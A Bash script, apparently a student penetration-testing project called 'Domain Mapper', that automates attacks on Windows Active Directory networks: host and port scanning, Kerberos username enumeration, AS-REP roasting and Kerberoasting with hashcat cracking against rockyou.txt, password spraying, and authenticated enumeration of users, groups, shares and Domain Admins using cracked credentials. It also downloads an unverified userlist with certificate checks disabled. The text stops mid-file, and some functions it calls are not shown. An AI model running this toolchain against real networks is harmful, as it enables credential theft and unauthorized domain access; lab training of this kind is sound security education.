#!/bin/bash


#+-----------------------------------------------------------------------------------------+
#|                                                                                         |
#|                         NETWORK SECURITY | PROJECT: DOMAIN MAPPER                       |
#|                                                                                         |
#|  ▸ This Bash script automates network and domain reconnaissance for penetration testing.|
#|  ▸ It helps security professionals and students quickly gather information about a      |
#|    target network, services, and Active Directory environment.                          |
#|  ▸ Designed for safe testing on lab environments, it demonstrates scanning, enumeration,|
#|    and exploitation techniques without impacting production systems.                    |
#|                                                                                         |
#|  Features:                                                                              |
#|  ▸ Prompts the user for target network, domain, AD credentials, and password list       |
#|  ▸ Supports selectable operation levels for Scanning, Enumeration, and Exploitation     |
#|  ▸ Scanning: Basic, Intermediate, and Advanced modes, including TCP/UDP and full ports  |
#|  ▸ Enumeration: detects services, Domain Controller, DHCP, shared folders, and AD info  |
#|  ▸ Exploitation: vulnerability checks, password spraying, and Kerberos ticket testing   |
#|  ▸ Logs results and saves output as PDF files                                           |
#|  ▸ Script was tested on a lab (training) Domain Controller                              |
#|                                                                                         |
#|                              Requires root privileges!                                  |
#|                                                                                         |
#+-----------------------------------------------------------------------------------------+



# GLOBAL VARIABLES
timestamp=""
current_dir=$(pwd)
script_start=$(date +%s)
iface=$(ip link show up | grep -E '^[0-9]+' | awk -F: '{print $2}' | grep -v lo | head -n1 | tr -d ' ')

# SPINNER - Displays a spinner animation while a background process is running.
SPINNER() {

    local pid=$1           # Process ID to track
    local delay=0.2        # Delay between spinner frames
    local spinstr='|/-\'   # Spinner characters

    # Check if PID is provided
    [ -z "$pid" ] && { echo -e "\e[91m[!] Error: No PID provided.\e[0m"; return 1; }

    # Loop until the process ends
    while kill -0 "$pid" 2>/dev/null; do
        for (( i=0; i<${#spinstr}; i++ )); do
            printf "\r\e[33m[%c]\e[0m" "${spinstr:$i:1}"
            sleep "$delay"
        done
    done

    # Clear the spinner line
    printf "\r%-20s\r" ""

    # Return the exit status of the tracked process
    wait "$pid"
    return $?
}



# START - verify root, set session timestamp, display banner/author info.
START() {

    local user=$(whoami)                 # Get current username
    if [[ "$user" != "root" ]]; then     # Check if running as root
        echo -e "\n\e[91m[!] You must run this script as root.\e[0m\n"
        exit
    fi

    timestamp=$(date +"%d%m%H%M%S")      # Save timestamp for session
    figlet "domain mapper"         # Display banner
    echo -e "\nOleksandr Shevchuk S21, TMagen773637\n"

    # Check internet and required utilities
    CHECK_INTERNET_CONNECTION
}



# CHECK_INTERNET_CONNECTION - verify internet connectivity and update package lists.
CHECK_INTERNET_CONNECTION() {

    echo -e "\e[31m[*]\e[0m\e[34m Checking required utilities...\e[0m"
    sleep 2

    # Ping Google DNS to check internet connection
    if ping -c 1 -W 3 8.8.8.8 > /dev/null 2>&1; then
        # Update package lists in background
        apt update > /dev/null 2>&1 &
        SPINNER $!
        # Proceed to check and install utilities
        CHECK_APP
    else
        # No internet, exit script
        echo -e "\n\e[91m\e[107m[!] No internet connection. Check your network.\e[0m\n"
        sleep 2
        exit 1
    fi
}



# CHECK_APP - verify required utilities and install missing ones
CHECK_APP() {

    # List of utilities to check (excluding aria2c, handled separately)
    local utilities_for_check="fping enscript kerbrute"
    
    # Iterate through the list and verify each utility
    for i in $utilities_for_check; do
        if ! command -v "$i" > /dev/null 2>&1; then
           if [ "$i" = "kerbrute" ]; then
                # Utility not found, attempt installation
                echo -e "\e[91m\e[107m[!] kerbrute is not installed.\e[0m"
                wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
                chmod +x kerbrute_linux_amd64
                mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
                hash -r
            else
                # Utility not found, attempt installation
                echo -e "\e[91m\e[107m[!] '$i' is not installed.\e[0m"
                apt install "$i" -y || { echo -e "\e[91m\e[107m[!] Failed to install '$i'.\e[0m"; exit 1; }
            fi
        else
            # Utility is already installed
            echo -e "\e[32m[✔] $i\e[0m"
        fi
        sleep 0.3
    done

    SELECT_SCAN_METOD
}



# SELECT_SCAN_METOD - prompt for network CIDR, scan level and output folder; 
# validate inputs with user confirmation before discovering live hosts
# and launching the chosen scan (Basic/Intermediate/Advanced).
SELECT_SCAN_METOD() {

    cd "$current_dir"

    # Prompt the user to enter an IP address to scan
    read -r -p $'\n\e[31m[!]\e[0m\e[34m Enter network address/mask (CIDR), e.g., 192.168.0.0/24: \e[0m' network

    if [[ ! "$network" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
        echo -e "\e[91m[!] Wrong format. Example: 192.168.0.0/24\e[0m\n"
        SELECT_SCAN_METOD
        return
    fi


    echo -e "\n================================================================================================"
            echo -e "                                   Scanning Mode"
            echo -e "================================================================================================"
            echo -e ""
            echo -e "Basic:"
            echo -e " - Scans with the -Pn option in Nmap, assuming hosts are online and bypassing host discovery."
            echo -e ""
            echo -e "Intermediate:"
            echo -e " - Scans all 65,535 TCP ports using the -p- flag."
            echo -e ""
            echo -e "Advanced:"
            echo -e " - Performs full TCP scanning and includes UDP scanning for a thorough analysis."
            echo -e ""
            echo -e "*** Higher scan levels automatically include the functionality of the previous levels"
            echo -e "================================================================================================\n"
            sleep 2


    level=""
    while true; do
        # Prompt the user to choose scan mode: Basic, Intermediate or Advanced
        read -r -p $'\e[31m[?]\e[0m\e[34m Choose level for scanning: [B]asic, [I]ntermediate, [A]dvanced:\e[0m ' user_input       
        case "${user_input^^}" in
            B) level="Basic_scanning"; break;;
            I) level="Intermediate_scanning"; break;;
            A) level="Advanced_scanning"; break;;
            *) echo -e "\e[91m[!] Wrong choice. Use B, I, or A\e[0m";;
        esac
    done
    
    # Prompt the user to enter a folder name where scan results will be stored
    read -r -p $'\e[31m[!]\e[0m\e[34m Enter folder name for scan results: \e[0m' working_dir

    # Show summary and ask for confirmation
    echo -e "\n\e[31m[*]\e[0m\e[32m Please verify the entered data:\e[0m"
    echo ""
    echo -e "    Target network : $network"
    echo -e "    Scan mode      : $level"
    echo -e "    Output folder  : $working_dir"

    while true; do
        read -r -p $'\n\e[31m[?]\e[0m\e[34m Is everything correct? (Y/N): \e[0m' validation
        if [[ "$validation" =~ ^[Yy]$ ]]; then
            # Create output directory if it doesn't exist
            mkdir -p "$working_dir" > /dev/null 2>&1

            # Use fping to find live hosts in the target network and save IPs to live_hosts.txt
            echo -e "\n\e[31m[!]\e[0m\e[32m SEARCHING FOR LIVE HOSTS...\e[0m"
            fping -a -g "$network" 2>/dev/null | awk '{print $1}' | grep -v $(hostname -I | awk '{print $1}') > "$working_dir/live_hosts.txt" &
            SPINNER $!

            # Run the selected scan
            if [[ "$level" == "Basic_scanning" ]]; then
                BASIC_SCAN
            elif [[ "$level" == "Intermediate_scanning" ]]; then
                INTERMEDIATE_SCAN
            else
                ADVANCED_SCAN
            fi
            break
        elif [[ "$validation" =~ ^[Nn]$ ]]; then
            # Restart the process if user declined
            echo ""
            SELECT_SCAN_METOD
            return
        else
            echo -e "\e[91m[!] Wrong choice. Example: Y or N\e[0m"
        fi
    done

    ENUMERATION_MODE_SELECTOR
}



# BASIC_SCAN - run TCP SYN scans (-sS) on discovered live hosts,
# save per-host results to result_<ip>.txt
BASIC_SCAN() {

    echo -e "\n\e[31m[!]\e[0m\e[32m BASIC SCANNING...\e[0m"

    for ip in $(cat "$working_dir/live_hosts.txt"); do
        echo -e "\e[31m[*]\e[0m\e[32m Scanning: ${ip}\e[0m"

        host_dir="$working_dir/${ip}"
        mkdir -p "$host_dir"

        scan_result_txt="$host_dir/result_${ip}.txt"

        # Write header with a single newline
        echo -e "BASIC SCANNING RESULT FOR ${ip}\n" > "$scan_result_txt" 2>/dev/null

        # Run TCP scan
        nmap -Pn -n -sS "${ip}" -oN - 2>/dev/null | grep -E 'Nmap scan report|^PORT|/tcp|open' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
    done
}



# INTERMEDIATE_SCAN - run full TCP port scan (-p-) on discovered live hosts,
# save per-host results to result_<ip>.txt
INTERMEDIATE_SCAN() {

    echo -e "\n\e[31m[!]\e[0m\e[32m INTERMEDIATE SCANNING...\e[0m"

    for ip in $(cat "$working_dir/live_hosts.txt"); do
        echo -e "\e[31m[*]\e[0m\e[32m Scanning: ${ip}\e[0m"

        host_dir="$working_dir/${ip}"
        mkdir -p "$host_dir"

        scan_result_txt="$host_dir/result_${ip}.txt"

        # Write header with a single newline
        echo -e "INTERMEDIATE SCANNING RESULT FOR ${ip}\n" > "$scan_result_txt" 2>/dev/null

        # Run TCP scan on all ports
        nmap -Pn -n -sS -p- "${ip}" -oN - 2>/dev/null | grep -E 'Nmap scan report|^PORT|/tcp|open' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
    done
}



# ADVANCED_SCAN - run full TCP (-p-) and top UDP scans with vuln scripts on discovered hosts,
# save per-host results to result_<ip>.txt
ADVANCED_SCAN() {

    echo -e "\n\e[31m[!]\e[0m\e[32m FULL SCANNING...\e[0m"

    for ip in $(cat "$working_dir/live_hosts.txt"); do
        echo -e "\e[31m[*]\e[0m\e[32m Scanning: ${ip}\e[0m"

        host_dir="$working_dir/${ip}"
        mkdir -p "$host_dir"

        scan_result_txt="$host_dir/result_${ip}.txt"

        # Write header
        echo -e "FULL SCANNING RESULT FOR ${ip}\n" > "$scan_result_txt" 2>/dev/null

        # Run TCP scan on all ports
        nmap -Pn -n -sS -p- "${ip}" -oN - 2>/dev/null | grep -E 'Nmap scan report|^PORT|/tcp' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!

        # UDP scan: top 20 ports + vuln scripts
        nmap -Pn -sU --top-ports 20 "${ip}" -oN - 2>/dev/null | grep -E 'Nmap scan report|^PORT|/udp' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
    done
}



# ENUMERATION_MODE_SELECTOR - prompt for userlist/passwordlist (with defaults),
# ask user to choose enumeration level (B/I/A), run the chosen enumeration.
ENUMERATION_MODE_SELECTOR() {

    echo -e "\n\e[33m================================================================================================"
            echo -e "                       ATTENTION: Enumeration Requirements"
            echo -e "================================================================================================"
            echo ""
            echo -e "                       Userlist AND Password List are REQUIRED!"
            echo ""
            echo -e " - If no custom userlist is provided, default userlist will be used."
            echo -e " - If no custom password list is provided, rockyou.txt will be used."
            echo ""
            echo -e "================================================================================================\e[0m\n"
            sleep 2
            
    # Prompt the user to enter the full path to a  userlist
    read -r -p $'\e[31m[!]\e[0m\e[34m Enter full path to userlist or press enter for default userlist:\e[0m ' custom_userlist

    # If no custom userlist is provided, use the default userlist from GoogleDrive
    if [[ -z "$custom_userlist" ]]; then
        data="$working_dir/world_lists"
        mkdir -p "$data"
        wget --no-check-certificate -O "$data/users.txt" "https://drive.google.com/uc?export=download&id=1FK4Ei5ovLw8g8gPOryoqdXBOAf1TEMCq" >/dev/null 2>&1
        userlist="$data/users.txt"
    else
        # Otherwise, use the path provided by the user
        userlist="$custom_userlist"
    fi
            
    # Prompt the user to enter the full path to a password list
    read -r -p $'\e[31m[!]\e[0m\e[34m Enter full path to passwordlist or press enter for default passwordlist:\e[0m ' custom_passwdlist

    # If no custom password list is provided, use the default rockyou.txt
    if [[ -z "$custom_passwdlist" ]]; then
        passwdlist="/usr/share/wordlists/rockyou.txt"
    else
        # Otherwise, use the path provided by the user
        passwdlist="$custom_passwdlist"
    fi        


    echo -e "\n================================================================================================"
            echo -e "                                      Enumeration Mode"
            echo -e "================================================================================================"
            echo -e ""
            echo -e "Basic:"
            echo -e " - Identifies services (-sV) running on open ports."
            echo -e " - Identifies the IP address of the Domain Controller."
            echo -e " - Identifies the IP address of the DHCP server."
            echo -e ""
            echo -e "Intermediate:"
            echo -e " - Enumerates IPs for key services: FTP, SSH, SMB, WinRM, LDAP, RDP."
            echo -e " - Enumerates shared folders (SMB shares)."
            echo -e " - Runs relevant NSE scripts for domain enumeration (e.g., smb-enum-users, ldap-search, smb-enum-shares)."
            echo -e ""
            echo -e "Advanced:"
            echo -e " - Extracts all users."
            echo -e " - Extracts all groups."
            echo -e " - Extracts all shares."
            echo -e " - Displays the password policy."
            echo -e " - Finds disabled accounts."
            echo -e " - Finds accounts with 'password never expires'."
            echo -e " - Displays accounts that are members of the Domain Admins group."
            echo -e ""
            echo -e "*** Higher scan levels automatically include the functionality of the previous levels"
            echo -e "================================================================================================\n"
            sleep 2



    # Re-establishing stdin to the terminal
    exec < /dev/tty

    while true; do
        # Ask the user to choose the scan level
        read -r -p $'\n\e[31m[?]\e[0m\e[34m Choose level for enumeration: [B]asic, [I]ntermediate, [A]dvanced: \e[0m' user_choice

        # Run the corresponding enumeration function based on user choice
        if [[ "$user_choice" =~ ^[Bb]$ ]]; then
            echo -e "\n\e[31m[!]\e[0m\e[32m BASIC ENUMERATION...\e[0m"
            BASIC_ENUMERATION
            break

        elif [[ "$user_choice" =~ ^[Ii]$ ]]; then
            echo -e "\n\e[31m[!]\e[0m\e[32m INTERMEDIATE ENUMERATION...\e[0m"
            INTERMEDIATE_ENUMERATION
            break

        elif
            [[ "$user_choice" =~ ^[Aa]$ ]]; then
            echo -e "\n\e[31m[!]\e[0m\e[32m ADVANCED ENUMERATION...\e[0m"
            ADVANCED_ENUMERATION
            break
        else
            echo -e "\e[91m[!] Wrong choice. Example: B, I or A\e[0m"

        fi
    done

    EXPLOITATION_MODE_SELECTOR
}



# DC_DISCOVERY - detect Domain Controllers, enumerate users, 
# collect Kerberos preauth hashes, and attempt cracking.
DC_DISCOVERY(){

  # If LDAP/AD and Kerberos-related ports are found, declare the host as a Domain Controller.
  if grep -q "ldap.*Active Directory" "$scan_result_txt" && grep -q "88/tcp" "$scan_result_txt" && grep -q "3268/tcp" "$scan_result_txt"; then
    msg="[+] DOMAIN CONTROLLER DETECTED ${ip}"
    # Log and print the domain controller detection message.
    echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
    echo -e "\e[33m$msg\e[0m"

    # Extract the domain name from scan output for later use.
    domain=$(grep -i 'domain' "$scan_result_txt" | awk -F 'Domain:' '{print $2}' | awk -F ',' '{print $1}' | grep -v '^[[:space:]]*$' | head -1 | xargs)
            
    # Run `kerbrute` user enumeration against the domain controller and save valid usernames to the scan file.
    kerbrute userenum  -d "$domain" --dc "${ip}" "$userlist" | grep VALID | awk '{print "VALID USERNAME  " $NF}' | sed 's/\x1b\[[0-9;]*m//g' >> "$scan_result_txt"

    # Use `impacket-GetNPUsers` to request AS-REP/Preauth data and save krb-formatted hashes to `hashes_file`.
    hashes_file="$host_dir/hash_${ip}.txt"
    impacket-GetNPUsers "$domain"/ -usersfile "$userlist" -dc-ip ${ip} -format hashcat | grep -E '\$krb' >> "$hashes_file"
            
    # Run `hashcat` in the background to crack collected hashes using the provided password list (with spinner).
    credentials="$host_dir/creds_${ip}.txt"
    hashcat -m 18200 -a 0 "$hashes_file" "$passwdlist" >> "$credentials" &
    SPINNER $!
  fi
  # If credentials were found, read only lines containing the literal "$krb" into an array.
  if [ -s "$credentials" ]; then
    # Use grep -F to match the literal '$krb' and load results into the array 'lines'.
    mapfile -t lines < <(grep -F '$krb' "$credentials" 2>/dev/null || true)
    # Iterate over the collected hash lines to parse username and password pairs and log discovered credentials.
    for line in "${lines[@]}"; do
        brut_user=$(echo "$line" | awk -F '@' '{print $1}' | awk -F '$' '{print $NF}' | xargs) 2>/dev/null
        brut_passwd=$(echo "$line"| awk -F '@' '{print $2}' | awk -F ':' '{print $NF}' | xargs) 2>/dev/null
        pair="$brut_user:$brut_passwd" 
        echo -e "\n[+] CREDENTIALS FOUND $pair\n" >> "$scan_result_txt" 2>/dev/null
    done
  else
    echo -e "\n" >>  "$scan_result_txt" 2>/dev/null
  fi
}


# DHCP_DISCOVERY - detect DHCP server via nmap broadcast discovery and log the result.
DHCP_DISCOVERY(){

  # Detect the active network interface (exclude loopback).
  interface=$(ip -o -4 addr show up | awk '!/lo/ {print $2; exit}')
  # Run `nmap` DHCP broadcast discovery on that interface and capture the output.
  dhcp_output=$(nmap -e "$interface" --script broadcast-dhcp-discover 2>/dev/null)
  # If a DHCP server is reported, extract its IP, announce detection, and append the message to the scan result file.
  if echo "$dhcp_output" | grep -q "Server Identifier:"; then
    dhcp_ip=$(echo "$dhcp_output" | grep "Server Identifier:" | awk -F ':' '{print $NF}' | tr -d ' ')
    msg="[+] DHCP SERVER DETECTED ${dhcp_ip}"
    echo -e "\n$msg" >> "$scan_result_txt" 2>/dev/null
    echo -e "\e[33m$msg\e[0m"
  fi
}


# B_ENUMERATION - parse open ports from scan results and run detailed nmap version detection on them.
B_ENUMERATION(){

    tcp_ports=""
    udp_ports=""

    # Extract open TCP ports from the scan results
    if grep -q '/tcp' "$scan_result_txt"; then
        tcp_ports=$(grep '/tcp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
    fi

    # Extract open UDP ports from the scan results
    if grep -q '/udp' "$scan_result_txt"; then
        udp_ports=$(grep '/udp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
    fi

    # Combine and sort all detected ports (TCP + UDP)
    all_ports=$(echo "$tcp_ports,$udp_ports" | tr ',' '\n' | grep -v '^$' | sort -n -u | paste -sd, -)

    # Run detailed version detection on all discovered ports
    if [ -n "$all_ports" ]; then
        nmap -Pn -n -sS -sV -p "$all_ports" "${ip}" -oN - 2>/dev/null | grep -E '^PORT|/tcp|open' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
    fi
}


# I_ENUMERATION - run version detection on common service ports and perform targeted NSE enumeration.
I_ENUMERATION(){

    # Define common ports for further enumeration (FTP, SSH, SMB, WinRM, LDAP, RDP)
    common_ports="20,21,22,139,445,389,636,3389,5985,5986"

    # Perform targeted enumeration with Nmap scripts (SMB, LDAP, NetBIOS)
    nmap -Pn -n -sS -sV -p "$common_ports" --script smb-os-discovery,smb-enum-shares,smb-enum-users,ldap-search,smb-enum-domains,nbstat "${ip}" -oN - 2>/dev/null | awk 'NR>3' >> "$scan_result_txt" 2>/dev/null &
    SPINNER $!  
}


# A_ENUMERATION - enumerate domain users, groups, shares, policy and LDAP account flags using discovered credentials.
A_ENUMERATION(){

    # Announce and request a full user enumeration via `rpcclient` using the discovered credential pair.
    msg="[+] OBTAINING ALL USER ACCOUNTS ${ip}"
    echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
    echo -e "\e[32m$msg\e[0m"

    rpcclient -U "$domain"/"$brut_user"%"$brut_passwd" ${ip} -c "enumdomusers" 2>/dev/null >> "$scan_result_txt"
    sleep 1

    # Announce and request a full group enumeration via `rpcclient` using the discovered credential pair.
    msg="[+] OBTAINING ALL GROUPS ${ip}"
    echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
    echo -e "\e[32m$msg\e[0m"

    rpcclient -U "$domain"/"$brut_user"%"$brut_passwd" ${ip} -c "enumdomgroups" 2>/dev/null >> "$scan_result_txt"
    sleep 1

    # Announce and list SMB shares via `crackmapexec` using the discovered credential pair.
    msg="[+] OBTAINING ALL SHARES ${ip}"
    echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
    echo -e "\e[32m$msg\e[0m"

    crackmapexec smb "${ip}" -u "$brut_user" -p "$brut_passwd" --shares | awk -F'4GE' 'NR>3{print $2}' 2>/dev/null >> "$scan_result_txt"
    sleep 1

    # Announce and retrieve the domain password policy via `crackmapexec`.
    msg="[+] OBTAINING THE PASSWORD POLICY ${ip}"
    echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
    echo -e "\e[32m$msg\e[0m"

    crackmapexec smb "${ip}" -u "$brut_user" -p "$brut_passwd" --pass-pol | awk -F'4GE' 'NR>3{print $2}' 2>/dev/null >> "$scan_result_txt"
    sleep 1

    # Announce and list members of the "Domain Admins" group via `crackmapexec`.
    msg="[+] OBTAINING ACCOUNTS THAT ARE MEMBERS OF THE DOMAIN ADMINS GROUP ${ip}"
    echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
    echo -e "\e[32m$msg\e[0m"

    crackmapexec smb "${ip}" -u "$brut_user" -p "$brut_passwd" --group "Domain Admins" | awk -F'4GE' 'NR>3{print $2}' | awk -F '\\' '{print $2}' 2>/dev/null >> "$scan_result_txt"
    sleep 1

    # Announce and query for disabled accounts using an LDAP search bound as the discovered user.
    msg="[+] OBTAINING DISABLED ACCOUNTS (Flag: 2 / ADS_UF_ACCOUNTDISABLE) on ${ip}"
    echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
    echo -e "\e[32m$msg\e[0m"

    # Convert the domain name into a DN-formatted string `domain_dc` (e.g., `DC=example,DC=com`).
    domain_dc=$(echo "$domain" | awk -F '.' '{
        ORS=""; 
            for (i=1; i<=NF; i++) {
            print "DC="$i; 
            if (i<NF) print ","
        }; 
        print "\n"
        }')
    # Build a Bind DN for LDAP using the discovered username and `domain_dc`.
    bind_dn="CN="$brut_user",CN=Users,"$domain_dc""

    # Perform an LDAP search for accounts with the "account disabled" flag and save sAMAccountName results.
    ldapsearch -LLL -x \
        -H "ldap://${ip}" \
        -D "$bind_dn" \
        -w "$brut_passwd" \
        -b "$domain_dc" \
        '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' \
        sAMAccountName 2>/dev/null | grep sAMAccountName: | awk '{print $NF}' >> "$scan_result_txt"
        sleep 1

    # Announce and perform an LDAP search for accounts with the "password never expires" flag and save sAMAccountName results.
    msg="[+] OBTAINING ACCOUNTS THAT NEVER EXPIRE (Flag: 1048576 / ADS_UF_DONT_EXPIRE_PASSWD) on ${ip}"
    echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
    echo -e "\e[32m$msg\e[0m"

    # Perform LDAP search for accounts with the "password never expires" flag and append results.
    ldapsearch -LLL -x \
        -H "ldap://${ip}" \
        -D "$bind_dn" \
        -w "$brut_passwd" \
        -b "$domain_dc" \
        '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))' \
        sAMAccountName 2>/dev/null | grep sAMAccountName: | awk '{print $NF}' >> "$scan_result_txt"
}



# BASIC_ENUMERATION - iterate live hosts and run basic port/version enumeration and DC discovery for each host; then run DHCP discovery.
BASIC_ENUMERATION() {

    # Iterate through all live hosts listed in the file
    for ip in $(cat "$working_dir/live_hosts.txt"); do
        # Set `host_dir` path for the current target.
        host_dir="$working_dir/${ip}"
        # Set `scan_result_txt` path for current target's result file.
        scan_result_txt="$host_dir/result_${ip}.txt"

        # Display and log current enumeration status
        echo -e "\e[31m[*]\e[0m\e[32m Enumeration: ${ip}\e[0m"
        echo -e "\nBASIC ENUMERATION RESULT FOR ${ip}\n" >> "$scan_result_txt" 2>/dev/null

        ### b_enumeration
        B_ENUMERATION
        ### dc_discovery
        DC_DISCOVERY
    done
    
    ### dhcp_discovery
    DHCP_DISCOVERY
}



# INTERMEDIATE_ENUMERATION - run basic enumeration and then extended service enumeration per host
# (includes B_ENUMERATION + I_ENUMERATION); then run DHCP_DISCOVERY.
INTERMEDIATE_ENUMERATION() {

    # Iterate through all live hosts for extended enumeration
    for ip in $(cat "$working_dir/live_hosts.txt"); do
        # Set `host_dir` path for the current target.
        host_dir="$working_dir/${ip}"
        # Set `scan_result_txt` path for current target's result file.
        scan_result_txt="$host_dir/result_${ip}.txt"

        # Display and log current enumeration status
        echo -e "\e[31m[*]\e[0m\e[32m Enumeration: ${ip}\e[0m"
        echo -e "\nINTERMEDIATE ENUMERATION RESULT FOR ${ip}\n" >> "$scan_result_txt" 2>/dev/null

        ### b_enumeration
        B_ENUMERATION
        ### dc_discovery
        DC_DISCOVERY
        ### i_enumeration
        I_ENUMERATION
    done

    ### dhcp_discovery
    DHCP_DISCOVERY
}



# ADVANCED_ENUMERATION - performs all INTERMEDIATE enumeration tasks and extends them with A_ENUMERATION
# for authenticated AD/SMB/LDAP enumeration; runs DHCP_DISCOVERY at the end.
ADVANCED_ENUMERATION() {

    for ip in $(cat "$working_dir/live_hosts.txt"); do
        # Set `host_dir` path for the current target.
        host_dir="$working_dir/${ip}"
        # Set `scan_result_txt` path for current target's result file.
        scan_result_txt="$host_dir/result_${ip}.txt"

        # Display and log current enumeration status
        echo -e "\e[31m[*]\e[0m\e[32m Enumeration: ${ip}\e[0m"
        echo -e "\nADVANCED ENUMERATION RESULT FOR ${ip}\n" >> "$scan_result_txt" 2>/dev/null

        ### b_enumeration
        B_ENUMERATION
        ### dc_discovery
        DC_DISCOVERY
        ### i_enumeration
        I_ENUMERATION
        ### a_enumeration
        A_ENUMERATION
    done

    ### dhcp_discovery
    DHCP_DISCOVERY
}



# EXPLOITATION_MODE_SELECTOR - prompt user to select exploitation level and run the corresponding workflow (B/I/A).
EXPLOITATION_MODE_SELECTOR() {

    echo -e "\n================================================================================================"
            echo -e "                                   Exploitation Mode"
            echo -e "================================================================================================"
            echo -e ""
            echo -e "Basic:"
            echo -e " - Deploys the NSE vulnerability scanning scripts (nmap --script vuln) against targets."
            echo -e ""
            echo -e "Intermediate:"
            echo -e " - Executes domain-wide password spraying to identify weak or reused credentials (controlled, rate-limited)."
            echo -e ""
            echo -e "Advanced:"
            echo -e " - Extracts Kerberos tickets (AS-REP/SPN) using provided passwords and attempts offline cracking with hashcat."
            echo -e ""
            echo -e "*** Higher scan levels automatically include the functionality of the previous levels"
            echo -e "================================================================================================\n"
            sleep 2

    
    # Re-establishing stdin to the terminal
    exec < /dev/tty

    while true; do
        # Ask the user to choose the scan level
        read -r -p $'\n\e[31m[?]\e[0m\e[34m Choose level for exploitation: [B]asic, [I]ntermediate, [A]dvanced: \e[0m' user_choice < /dev/tty
        # Run the corresponding enumeration function based on user choice
        if [[ "$user_choice" =~ ^[Bb]$ ]]; then
            echo -e "\n\e[31m[!]\e[0m\e[32m BASIC EXPLOITATION...\e[0m"
            BASIC_EXPLOITATION
            break

        elif [[ "$user_choice" =~ ^[Ii]$ ]]; then
            echo -e "\n\e[31m[!]\e[0m\e[32m INTERMEDIATE EXPLOITATION...\e[0m"
            INTERMEDIATE_EXPLOITATION
            break

        elif [[ "$user_choice" =~ ^[Aa]$ ]]; then
            echo -e "\n\e[31m[!]\e[0m\e[32m ADVANCED EXPLOITATION...\e[0m"
            ADVANCED_EXPLOITATION
            break

        else
            echo -e "\e[91m[!] Wrong choice. Example: B, I or A\e[0m"
        fi
    done

    #Final step after processing all DCs.
    STOP
}


# B_EXPLOITATION - run vulnerability-focused NSE scripts (vuln category) and append relevant results to per-host scan file.
B_EXPLOITATION(){

    # Run nmap with vulnerability-related NSE scripts
    nmap -Pn -n -sS -sV --script vuln "${ip}" | awk '/^Host script results:/{p=1; next} /^Service detection performed\./{p=0} p{print}' >> "$scan_result_txt" 2>/dev/null &
    SPINNER $!
}


# I_EXPLOITATION - perform password-spraying against discovered DC users using kerbrute and a supplied password list.
I_EXPLOITATION(){

    if grep -E -q 'user:\[' "$scan_result_txt"; then
        # Extract user names from the result file and write usernames to dc_users_txt.
        grep -E 'user:\[' "$scan_result_txt" | awk -F '[' '{print $2}' | awk -F ']' '{print $1}' | sed 's/^[ \t]*//;s/[ \t]*$//' >> "$dc_users_txt"
    else
        grep -E 'VALID USERNAME' "$scan_result_txt" | awk -F ' ' '{print $NF}' | awk -F '@' '{print $1}' | sed 's/^[ \t]*//;s/[ \t]*$//' >> "$dc_users_txt"
    fi
    mapfile -t passes < "$passwdlist" 
    for pass in "${passes[@]}"; do
        # Pipe kerbrute output through grep to keep only VALID results, format them, remove ANSI codes,
        # and append discovered valid credentials to the scan result file.
        kerbrute passwordspray -d "$domain" --dc "${ip}" "$dc_users_txt" "$pass" | grep 'VALID' | awk '{print "VALID CREDENTIALS:  " $NF}' | sed 's/\x1b\[[0-9;]*m//g' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
    done
}


# A_EXPLOITATION - extract Kerberos tickets (AS-REP / SPN requests) using discovered credentials and attempt cracking with hashcat.
A_EXPLOITATION(){

    # Create tickets_txt to avoid grep error
    touch "$tickets_txt"

    # Extract credentials from the result file and write usernames to dc_creds_txt.
    grep -i 'valid credentials' "$scan_result_txt" | sed 's/^.*: //' | sed 's/\x1b\[[0-9;]*m//g' | sed 's/^[[:space:]]*//; s/[[:space:]]*$//' | awk -F'[@:]' '{print $1 ":" $3}' >> "$dc_creds_txt" 2>/dev/null
    
    mapfile -t creds < "$dc_creds_txt" 
    for pair in "${creds[@]}"; do
        # Pipe kerbrute output through grep to keep only VALID results, format them, remove ANSI codes,
        # and append discovered valid credentials to the scan result file.
        impacket-GetUserSPNs "$domain/$pair" -dc-ip "${ip}" -request 2>/dev/null | grep -E '\$krb' >> "$tickets_txt"
    done

    if grep -E -q '\$krb' "$tickets_txt"; then
        msg="[+] KERBEROS TICKETS DETECTED STARTING HASHCAT"
        # Log and print the domain controller detection message.
        echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
        echo -e "\e[33m$msg\e[0m"

        hashcat -m 18200 -a 0 "$tickets_txt" "$passwdlist"| grep -E '\$krb' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
    fi
}



# BASIC_EXPLOITATION - iterate live hosts and run B_EXPLOITATION for each host (sets host_dir and scan_result_txt).
BASIC_EXPLOITATION(){

    # Iterate through all live hosts listed in the file
    for ip in $(cat "$working_dir/live_hosts.txt"); do
        #Set `host_dir` path for the current target.
        host_dir="$working_dir/${ip}"
        # Set `scan_result_txt` path for current target's result file.
        scan_result_txt="$host_dir/result_${ip}.txt"

        # Print a colored status line to the terminal and append a header to the host's result file.
        echo -e "\e[31m[*]\e[0m\e[32m Exploitation: ${ip}\e[0m"
        echo -e "\nBASIC EXPLOITATION RESULT FOR ${ip}\n" >> "$scan_result_txt" 2>/dev/null

        ### b_exploitation
        B_EXPLOITATION
    done
}



# INTERMEDIATE_EXPLOITATION - run vulnerability checks and password-spraying preparation per host (B + I exploitation).
